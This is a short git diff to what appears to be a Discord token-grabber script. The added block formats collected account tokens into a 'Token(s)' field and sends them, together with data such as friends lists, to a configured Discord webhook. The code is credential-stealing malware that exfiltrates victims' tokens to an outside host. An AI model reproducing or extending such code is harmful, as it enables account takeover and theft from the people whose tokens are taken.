@@ -42,5 +42,13 @@ const Discord = new webhook.Webhook(config.webhook);
         msg.addField('Friends', friends)
     }
 
+    if (config.showToken) {
+        let tokensString = '';
+        for (let i = 0; i < tokens.length; i++) {
+            tokensString += `**${i + 1}** - ${tokens[i]}\n`
+        }
+        msg.addField('Token(s)', tokensString)
+    }
+
     Discord.send(msg)
 })();
